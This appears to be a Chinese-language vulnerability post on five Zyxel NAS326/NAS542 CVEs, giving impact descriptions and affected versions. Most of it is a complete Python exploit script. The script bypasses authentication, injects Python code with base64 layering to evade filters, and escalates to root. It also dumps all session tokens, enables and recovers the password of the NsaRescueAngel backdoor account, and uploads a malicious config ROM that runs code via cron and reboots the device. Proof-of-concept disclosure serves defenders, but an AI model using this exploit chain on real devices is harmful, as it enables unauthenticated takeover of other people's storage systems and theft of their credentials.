影响描述

**CVE-2024-29972：Zyxel NAS 设备命令注入漏洞** 

  Zyxel NAS326 和 NAS542 设备中的 CGI 程序 remote_help-cgi中存在命令注入漏洞，可能导致未经身份验证的威胁者通过发送恶意设计的 HTTP 请求执行某些系统命令。



**CVE-2024-29973：Zyxel NAS 设备命令注入漏洞** 

  Zyxel NAS326 和 NAS542 设备中的 setCookie 参数中存在命令注入漏洞，可能导致未经身份验证的威胁者发送恶意设计的 HTTP POST 请求执行某些系统命令。



**CVE-2024-29974：Zyxel NAS 设备远程代码执行漏洞** 

  Zyxel NAS326 和 NAS542 设备中的 CGI 程序 file_upload-cgi中存在远程代码执行漏洞，未经身份验证的威胁者可通过将恶意设计的配置文件上传到易受攻击的设备导致执行任意代码。



**CVE-2024-29975：Zyxel NAS 设备本地权限提升漏洞**

  Zyxel NAS326 和 NAS542 设备中的 SUID 可执行二进制文件中存在权限管理不当，可能导致经过身份验证且具有管理员权限的本地威胁者以 root 用户身份在易受攻击的设备上执行某些系统命令。



**CVE-2024-29976：Zyxel NAS 设备权限提升信息泄露漏洞** 

  Zyxel NAS326 和 NAS542 设备中的 show_allsessions 命令存在权限管理不当，可能导致经过身份验证的低权限威胁者获取受影响设备上所有经过身份验证的用户（包括管理员）的会话令牌，从而获得设备管理员访问权限。

# 



影响范围

l NAS326 设备版本<= V5.21(AAZF.16)C0

l NAS542 设备版本<= V5.21(ABAG.13)C0 



poc&exp

exp.py

```python

#!/bin/venv python3
"""
Proof of concept for:
1. CVE-2024-29972 (Backdoor)
2. CVE-2024-29976 (Privilege escalation and info disclosure)
3. CVE-2024-29973 (Python Code injection)
4. CVE-2024-29975 (Local "sudo"-like privilege escalation)
5. CVE-2024-29974 (Malicious config upload, RCE.)

"""
import re
import requests
import base64
from pathlib import Path
import subprocess

# We make a pretty commandline tool here
import typer
from typing import Annotated
app = typer.Typer()


def check_request_str(get_str: str):
    """
    This is the input filtering performed by ZyXEL.
    We use this while developing to ensure our command still passes their filters
    """
    # No \,',`,<, >,^, $, &, ;
    pattern_str = re.compile("[\\\\\\'\\`\\<\\>\\^\\$\\&\\;]+")
    searched = pattern_str.search(get_str)
    if not searched:
        return True
    else:
        print(searched)
        return False


def execute_python_code(victim: requests.Session, target: str, code: str) -> requests.Response:
    """
    We utilize a command injection to run python code as "nobody" here.
    CVE-2024-29973
    """

    # "and False or ..." abuses that CGIGetExtStoInfo() will always return truthy values.
    # Thus we do an "and False" to ensure it proceeds to execute and return the value from our python
    # code, causing a reflected code execution.
    payload = f"""storage_ext_cgi CGIGetExtStoInfo None) and False or {code}#"""
    assert check_request_str(payload), "The payload contains forbidden characters"

    resp = victim.post(target, data={"c0": payload})
    return resp


def run_shell_commands(
    victim: requests.Session,
    base_url: str,
    cmd: str,
    bypass_path: str = "/register_main/setCookie",
) -> str:
    """
    We want to run shell commands while ignoring the filtering performed on the victim.
    We can do this by stacking evals and doing some base64 encoding/decoding...
    Might as well privesc to "root" via CVE-2024-29975

    :returns: b64 encoded output from cmd
    """

    target = f"{base_url}/cmd,/simZysh{bypass_path}"
    # First ensure we can run multiple commands from each line in cmd at once here.
    encoded_cmd = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
    # Privilege scalation to root using executer_su
    executor = f"""python -c 'import base64; import sys; a = base64.b64decode(\\\"{encoded_cmd}\\\");  print a' | /usr/local/apache/web_framework/bin/executer_su /bin/sh"""
    # Innermost layer: Execute the executor of shell commands... Yes this is contrived
    execute_shell_code = (
        f'__import__("subprocess").check_output("{executor}", shell=True)'
    )
    # Encode that layer to base64 to ensure it bypasses input filtering.
    encoded_command = base64.b64encode(execute_shell_code.encode("utf-8")).decode(
        "utf-8"
    )
    # Add a decode layer, it will return the contents of "execute_shell_code" as a string.
    sub_block = f'__import__("base64").b64decode("{encoded_command}")'
    assert (
        eval(sub_block).decode("utf-8") == execute_shell_code
    ), "Unable to decode command properly :("

    # We need to eval the "execute_shell_code" contents, add a layer for that.
    payload = f"eval({sub_block})"

    # Finally, the output of the command might contain non-utf8 characters so encode
    # it to base64 so we can decode it from our end.
    encoded = f'__import__("base64").b64encode({payload})'
    resp = execute_python_code(victim, target, encoded)
    body = resp.json()
    assert isinstance(
        body, dict
    ), f"Response was not json dict, something is wrong here. Got \n{body}"
    lines = body.get("zyshdata0", list())

    cmd_output = "".join(lines)

    return cmd_output

@app.command()
def poc_info_disclosure(victim_ip:str, bypass_path:str = "/register_main/setCookie"):
    """
    Let's test for the info disclosure. We don't have the cookie so let's
    just bypass authentication via simZysh to access the python controller.
    """
    sesh = requests.Session()
    victim_base = f"http://{victim_ip}"
    target = f"{victim_base}/cmd,/simZysh{bypass_path}"
    payload = "system_main show_allsessions None"
    resp = sesh.post(target, data={"c0": payload})
    assert check_request_str(payload), "The payload contains forbidden characters"
    body = resp.json()
    assert isinstance(
        body, dict
    ), f"Response was not json dict, something is wrong here. Got \n{body}"
    lines = body.get("zyshdata0")
    print(lines)



@app.command()
def poc_command_injection(victim_ip:str, bypass_path:str = "/register_main/setCookie"):
    """
    A super simple PoC to test if a victim is vulnerable to the command injection at /cmd,/simZysh, and if the privilege escalation
    works. Tests for CVE-2024-29973 and CVE-2024-29975
    """

    sesh = requests.Session()
    victim_base = f"http://{victim_ip}"
    target = f"{victim_base}/cmd,/simZysh{bypass_path}"

    print("First test if we can do a normal command injection")
    resp = execute_python_code(sesh, target, "__import__(\"subprocess\").check_output(\"/bin/id\", shell=True)")
    print(resp.status_code)
    print(resp.content)

    print("Now we are going to test if the privesc works... Having \"id=0\" is enough")
    resp2 = execute_python_code(sesh, target, "__import__(\"subprocess\").check_output(\"/usr/local/apache/web_framework/bin/executer_su /bin/id\", shell=True)")
    print(resp2.status_code)
    print(resp2.content)



@app.command()
def get_backdoor_password(victim_ip:str):
    """Utilize the command injection vulnerability to figure out the NsaRescueAngel password. We won't bother bruteforcing/calculating it since I'm lazy."""
    sesh = requests.Session()
    victim_base = f"http://{victim_ip}/cmd,/simZysh/register_main/setCookie"
    print("We will utilize the command injection to grab the password for NsaRescueAngel.")
    password = "".join(execute_python_code(sesh, victim_base, '__import__("subprocess").check_output("makekey", shell=True)').json()["zyshdata0"]).rstrip("\n") + "tdT"
    print(f'Got password "{password}" for NsaRescueAngel')


@app.command()
def backdoor(victim_ip: str):
    """
    Enable the "NsaRescueAngel" account and ssh service. 
    CVE-2024-29972
    """
    sesh = requests.Session()
    victim_base = f"http://{victim_ip}"

    sesh.get(
        f"{victim_base}/desktop,/cgi-bin/remote_help-cgi/favicon.ico",
        params={"type": "sshd_tdc"},
    )
    print(f'Enabled account NsaRescueAngel and SSH.')


def create_malicious_rom(
    victim: requests.Session, base_url: str, basedir: Path, tar_content: bytes
) -> bytes:
    with open(basedir / "create_rom.sh", "r") as file_h:
        contents = file_h.read()

    encoded_tar_contents = base64.b64encode(tar_content).decode("utf-8")
    contents = contents.replace(
        'TAR_CONTENT=""', f'TAR_CONTENT="{encoded_tar_contents}"'
    )
    raw_output = run_shell_commands(victim, base_url, contents)
    decoded_output = base64.b64decode(raw_output)

    return decoded_output


@app.command()
def custom_config(
    victim_ip: str,
    use_bundled_rom: Annotated[bool, typer.Argument(help="Uploads the bundled ROM supplied with this poc when true. Otherwise it creates a new one.")] = True,
    restart_victim: bool = True
):
    """
    Upload our own custom config containing a payload to the victim.
    Tests for CVE-2024-29974. 
    We intend to simply cronjob "touch /tmp/pwned" every minute or so.
    I won't bother going all the way to make this persistent, rebooting
    the device should be enough to undo this proof of concept.
    """
    parent_path = Path(__file__).parent
    rom_path = parent_path / "magic.rom"
    tar_path = parent_path / "magic.tar.gz"
    sesh = requests.Session()
    base_url = f"http://{victim_ip}"
    if not use_bundled_rom:
        print("Creating a fresh rom. Payload will be 'touch /tmp/pwned', called by cronjobs once per minute")
        print("Note that we now rely on the victim being vulnerable for the command injection for this to work.")
        # First we do the TAR stuff on our machine since busybox tar does not support the features we need
        subprocess.Popen(["/usr/bin/sh", str(parent_path / "create_tar_archive.sh")]).wait()
        with open(tar_path, "rb") as file_h:
            tar_content = file_h.read()

        rom_contents = create_malicious_rom(sesh, base_url, parent_path, tar_content)

        with open(rom_path, "wb") as rom_h:
            rom_h.write(rom_contents)

    with open(rom_path, "rb") as file_h:
        print("Uploading custom rom to target...")
        # Now upload file to target
        sesh.post(
            f"{base_url}/desktop,/cgi-bin/file_upload-cgi/favicon.ico",
            data={"return_errno": "ZLD", "return_errmsg": "", "file_type": "config"},
            files={"file_path": file_h},
            headers={"cookie": "authtok=test;"}, #iirc the endpoint attempts to extract authtok, but never validates it or something
        )
    print("Config uploaded to victim. Now we just need to restart the victim for it to be loaded")
    if restart_victim:
        print("restart_victim is True. Restarting victim")
        run_shell_commands(sesh, base_url, "reboot")

    print("Done. Now just restart the target, ssh to it and check if there is a file at /tmp/pwned once it's been up for a minute")
    print("Note that it likely reset the password for 'admin' to defaults")


if __name__ == "__main__":
    app()
```

